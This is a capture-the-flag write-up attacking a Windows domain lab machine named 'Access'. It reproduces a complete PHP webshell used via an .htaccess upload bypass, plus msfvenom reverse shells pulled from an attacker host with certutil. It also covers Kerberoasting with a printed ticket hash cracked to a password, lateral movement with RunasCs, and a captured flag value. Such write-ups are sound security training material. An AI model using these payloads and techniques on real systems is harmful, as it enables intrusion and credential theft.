# CTF Writeup: Access

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.215.187
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 09:50 EST
Nmap scan report for 192.168.215.187
Host is up (0.023s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 14:51:02Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open     ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49701/tcp open     msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/11%OT=53%CT=1%CU=32252%PV=Y%DS=4%DC=T%G=Y%TM=69134D
OS:A3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=
OS:104%GCD=2%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%TS=U
OS:)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=108%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578
OS:NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)EC
OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-11T14:52:12
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   20.79 ms 192.168.45.1
2   20.77 ms 192.168.45.254
3   20.82 ms 192.168.251.1
4   20.86 ms 192.168.215.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.50 seconds
```

Analyzing the webpage running on port 80, I found out:

- The Nmap Scan provided us with the information that php is utilized.
- Template: TheEvent - v4.6.0
- Potential usernames --> created wordlist of the users.



```
cat user.txt   
brenden
hubert
cole
jack
aljenadrin
willow
```

We discovered an /upload directory, while fuzzing for endpoints & an upload functionality. Further testing revealed that we are able to upload an .htaccess file, which means we can technically override the filter restrictions which are currently in tact. We also know that the backend is working with php which means after activating php, we can upload our reverse shell php script and should gain an foothold.

```
AddType application/x-httpd-php .evil
```

Uploaded the custom made .htaccess file, now we will utilize an webshell from wolf

```
#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 *
 * wwwolf-php-webshell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ******************************************************************************/

/*
 * Optional password settings.
 * Use the 'passhash.sh' script to generate the hash.
 * NOTE: the prompt value is tied to the hash!
 */
$passprompt = "WhiteWinterWolf's PHP webshell: ";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}

function fetch_fopen($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	if (strpos($host, '://') === false)
	{
		$host = 'http://' . $host;
	}
	else
	{
		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
	}
	$rh = fopen("${host}:${port}${src}", 'rb');
	if ($rh !== false)
	{
		$wh = fopen($dst, 'wb');
		if ($wh !== false)
		{
			$cbytes = 0;
			while (! feof($rh))
			{
				$cbytes += fwrite($wh, fread($rh, 1024));
			}
			fclose($wh);
			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($rh);
	}
	else
	{
		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
	}
	return $ret;
}

function fetch_sock($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	$host = str_replace('https://', 'tls://', $host);
	$s = fsockopen($host, $port);
	if ($s)
	{
		$f = fopen($dst, 'wb');
		if ($f)
		{
			$buf = '';
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fwrite($f, $buf);
			fclose($f);
			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
	}
	return $ret;
}

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?>
				<form method="post" action="<?php e($url); ?>">
					<?php e($passprompt); ?>
					<input type="password" size="15" name="pass">
					<input type="submit" value="Send">
				</form>
			<?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}

if (! ini_get('allow_url_fopen'))
{
	ini_set('allow_url_fopen', '1');
	if (! ini_get('allow_url_fopen'))
	{
		if (function_exists('stream_select'))
		{
			$fetch_func = 'fetch_sock';
		}
		else
		{
			$fetch_func = '';
			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
				. " disabled and 'stream_select()' missing).<br />";
		}
	}
}
if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}

if (! empty($fetch_func) && ! empty($fetch_path))
{
	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}

if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php e($url); ?>"
	<?php if (ini_get('file_uploads')): ?>
		enctype="multipart/form-data"
	<?php endif; ?>
	>
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="<?php e($auth); ?>">
	<?php endif; ?>
	<table border="0">
		<?php if (! empty($fetch_func)): ?>
			<tr><td>
				<b>Fetch:</b>
			</td><td>
				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
			</td></tr>
		<?php endif; ?>
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
			<?php if (ini_get('file_uploads')): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload">
			<?php endif; ?>
		</td></tr>
		<tr><td>
			<b>Cmd:</b>
		</td><td>
			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
		</td></tr>
		<tr><td>
		</td><td>
			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
		</td></tr>
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>";
	e($cmd);
	echo "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen('exec 2>&1; ' . $cmd, 'r');
	}
	else
	{
		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
		@ flush();
	}
}
echo "</pre>";

exit;
?>
```

Change from .php to .evil

```
mv wolfswebshell.php shell.evil
```

Upload the .evil file onto the target and access it on the /uploads directory --> Gained Command Injection.

Created payload, which will be downloaded onto the target machine.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Launched up python3 server on local machine.

```
python3 -m http.server 80
```

Navigated into command injection field and prompted following command:

```
certutil -urlcache -split -f http://192.168.45.166/shell.exe C:/Windows/Temp/shell.exe
```

Started up listener on port 1337

```
nc -lvnp 1337
```

Executed payload.

```
C:/Windows/Temp/shell.exe
```

Gained RCE as user "svc_apache".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.215.187] 50370
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>whoami
whoami
access\svc_apache

C:\xampp\htdocs\uploads>
```

Enumerated SPN's on target system.

```
PS C:\users\public\Temp> setspn.exe -Q */*
setspn.exe -Q */*
Checking domain DC=access,DC=offsec
CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
        ldap/SERVER.access.offsec/ForestDnsZones.access.offsec
        ldap/SERVER.access.offsec/DomainDnsZones.access.offsec
        DNS/SERVER.access.offsec
        GC/SERVER.access.offsec/access.offsec
        RestrictedKrbHost/SERVER.access.offsec
        RestrictedKrbHost/SERVER
        RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
        HOST/SERVER/ACCESS
        HOST/SERVER.access.offsec/ACCESS
        HOST/SERVER
        HOST/SERVER.access.offsec
        HOST/SERVER.access.offsec/access.offsec
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec
        ldap/SERVER/ACCESS
        ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
        ldap/SERVER.access.offsec/ACCESS
        ldap/SERVER
        ldap/SERVER.access.offsec
        ldap/SERVER.access.offsec/access.offsec
CN=krbtgt,CN=Users,DC=access,DC=offsec
        kadmin/changepw
CN=MSSQL,CN=Users,DC=access,DC=offsec
        MSSQLSvc/DC.access.offsec

Existing SPN found!
```

Download/request TGS Ticket for specific user.

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DC.access.offsec"
```

Retrieve all of the tickets for said SPN

```
setspn.exe -T access.offsec -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
Id                   : uuid-c733834e-725f-4440-8570-e0c62758c1d0-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/12/2025 2:50:06 PM
ValidTo              : 11/13/2025 12:30:19 AM
ServicePrincipalName : Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-c733834e-725f-4440-8570-e0c62758c1d0-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/12/2025 2:50:06 PM
ValidTo              : 11/12/2025 2:52:06 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-c733834e-725f-4440-8570-e0c62758c1d0-4
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/12/2025 2:30:19 PM
ValidTo              : 11/13/2025 12:30:19 AM
ServicePrincipalName : MSSQLSvc/DC.access.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Decided to utilize powerview in order to kerberoast.


Created an Temp folder in C:\Users\Public and downloaded powerview.ps1 script inside it than imported it.

```
Import-Module .\powerview.ps1
```

and ran the following command in order to check for kerberoastable users on the target domain.

```
GetDomainUser * -spn | select samaccountname
```

Extracted SPN from service mssql account user.

```
PS C:\users\public\Temp> Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_mssql
DistinguishedName    : CN=MSSQL,CN=Users,DC=access,DC=offsec
ServicePrincipalName : MSSQLSvc/DC.access.offsec
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$013F190B9AAD406E93E04DF6CB6997EA
                       $97727BB2E3463C9EC9668A03CCC3A3D06527176E8C23F75907600E43BF0D778C4850F2B12DABBE8D16A13FD32D373F9
                       4A49E27F49607AD7983EE0A2523BB0C3AAEB45F3A600AB8A7F9EBA7EB94FFAED26A8C9A25C38183349C997D65C0AC4A6
                       4D2A4D76F5BFBE39BC6C151220FAB9D38447CD3FEA7D0C18E0D6A71C03EBAE22EA42E536F44467CB598EAD1E86884E14
                       854AABF915E66CF9C6B42E7F89651C0804D1EF51562FC09D155D7B62E8BFBFB29DAA16B5843415557C556AC0F72FB4B1
                       47846F5708B8F2829EF72D193592FA1775709F15236651FE0A3CD758C587592ED90E7C8CB8EC1F0AF7DB88CEB848CC08
                       CA19FFFF7C4B41169482A8424B9695AD1551F91459D1A75BAA9545A3615699D50F408F887686674EE50659CC5051CCDB
                       6D113BBD9A311B6CC846689781193088C2425A92F5C436426719E94B5A37CBE14F2F7425B69634BC86A660EB1E8E17F2
                       4FBE0A8AB23641C67E94F437E473261E8540CBE530BC1A72AEE5D21F9F1ED54CEE3CD8853B2D9D75820D25B1CDD194E4
                       1AF64F8A378900A0CB8784AE4B289C4A2B8CEA80E380AD5D9CAA0C7CC1599D6F9A29C59140F5B17921D8D9476D1FC5C4
                       5A60A22E6412951933C8CA2E5E7FAE2088BFE98F95FD448FCA5646ADA452EDFA8369FE0954353AD34F3111C32686E776
                       28575EA23AC8CA618722AE65342FAFD21A3CADDF636A62862DC5F6E1052E65935C2458E0742A0EAA9DBAFC18508CB040
                       9A4D9858ACB751C5B43298E4081FB63F9E883F1410635E7E319039281A342806C0C79FFD70192D463B74AE6921AA4865
                       E45225EF3D41E25A786C2357F752B55C12DEF8F6298C2B668C8444D3F955137494573D988E5D6625053C694E41E5389A
                       F21A71D1F772DBCD0AA3CE05890FE1A5E331CECFE7A21BB98784C2B9BBFEFC1FEAB91BD5DE94C600CA9266417B60A92F
                       B7927B6D11B3DAE607C39A4D3B5A2D1C130187EC67E3F0CAEB7F2D278745CA87FC2F328CF8E740C07D86B95A690453EE
                       2852A84D6046492F9292FAEC29C5435E7C9F853CA20A34D27337B7C926B01AD6F6396FEBBE25108702F64BFF91654E95
                       DB73B86AA0C9890427794937A1EC51DE5441FDCF8B048889D483C8B02E14E4D87F3295123DA4BCAC84F6C4B98531E276
                       736DFA6141214B1216A580E2A4226AE89ED8323CD8B24741430BA4BA3A334E6E31CA9F6128A4B01A3A20FA95BCA2DD67
                       455B8017087DB6257607DBA715683D21997DA014E3887BD01112C841789FB366B58C8DC8B2482D6292AB3A2492D3897A
                       5AE5A7630E1E2B604D8AA89045D0027042B16DACF71C0A21AD438A1D39F30BA987252A9B45FA9BE47EC7300F2D1AE2FE
                       AF2E6BB069778F55875FCDA98ED6C0C66D4818075F2BAAE9049E2A23E7D17CD2AE5B03A0F2D9C6A409F75F4EABD9CDAE
                       6455247CC1100FC6B0594DF59FF5168B16E05417EB83AB8EB5D6DB343A44839D78B7F1BD548C2E51AF212F3716924444
                       E12CB41A11664706237C7BBBF264EA11112A92B37291B8538669131444949AA418802E79ABE0A36A5598E86F1B761B4D
                       30FBA5E51432307815A4A23C1A2A58C2B7033055F4ADC13099983188B611826596DDB
```

Let's crack the hash of the svc_mssql user with hashcat.

I had to make ChatGPT align the hash when saving it.

Bruteforced an password utilizing hashcat. --> trustno1

```
hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt
```

Unfortunately we weren't able to externally use any tools like nxc to connect with the new credentials, but we can utilize an script called RunasCs.ps1, let's download it on the target machine.

This script should be able to provide us command injection.

```
Import-Module .\Invoke-RunasCs.ps1
```

Ran the script and it works, we have command injection as user svc_mssql.

```
PS C:\Users\Public\Temp> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

access\svc_mssql
```

Let's create an new reverse shell script with msfvenom, startup an listener and execute the shell script as this user.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.222 LPORT=8888 -f exe > rev.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Downloaded the shell script onto the target system & started up listener on port 8888

```
nc -lvnp 8888
```

Executed the Script.

```
PS C:\Users\Public\Temp> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "rev.exe"
```

Gained RCE as user "svc_mssql".

```
nc -lvnp 8888             
listening on [any] 8888 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.248.187] 60359
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql
```

Retrieved local.txt in C:\Users\svc_mssql\Desktop

```
7af9fd4cf3dfddc9fa8399df3b866eef
```

Analyzing the user's privs we discover he is running "SeManageVolumePrivilege", but it's disabled.

```
C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

For the SeManageVolumePrivilege there is handy exploit's, which enable the priv + grant system shell.

```
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
```



```

```



```

```
